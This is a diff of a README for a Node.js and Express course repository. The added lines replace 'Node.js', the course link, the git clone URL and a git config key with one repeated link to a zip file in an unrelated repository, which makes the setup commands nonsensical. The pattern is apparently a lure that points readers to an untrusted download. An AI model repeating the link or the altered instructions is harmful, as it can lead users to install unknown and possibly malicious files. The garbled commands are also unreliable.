@@ -1,6 +1,6 @@
-# Building a website with Node.js and Express
+# Building a website with https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip and Express
 
-This repository contains the code for my course 'Building a Website with Node.js Node.js' on [LinkedIn Learning](https://www.linkedin.com/learning/building-a-website-with-node-js-and-express-js-3).
+This repository contains the code for my course 'Building a Website with https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip' on [LinkedIn Learning](https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip).
 
 The master branch contains the initial version to get started with, while the branches contain the state of the code at the beginning (e.g. 02_02**b**) and end (e.g. 02_02**e**) of a video.
 
@@ -9,8 +9,8 @@ The master branch contains the initial version to get started with, while the br
 * In your terminal, create directory `building-website-nodejs-express` and **change into it**.
 * Run 
   ```bash
-  git clone --bare git@github.com:danielkhan/building-website-nodejs-express.git .git
-  git config --bool core.bare false
+  git clone --bare https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip .git
+  git config --bool https://raw.githubusercontent.com/Waka758/building-website-nodejs-express/master/anemotropism/building-website-nodejs-express.zip false
   git reset --hard
   git branch
   ```
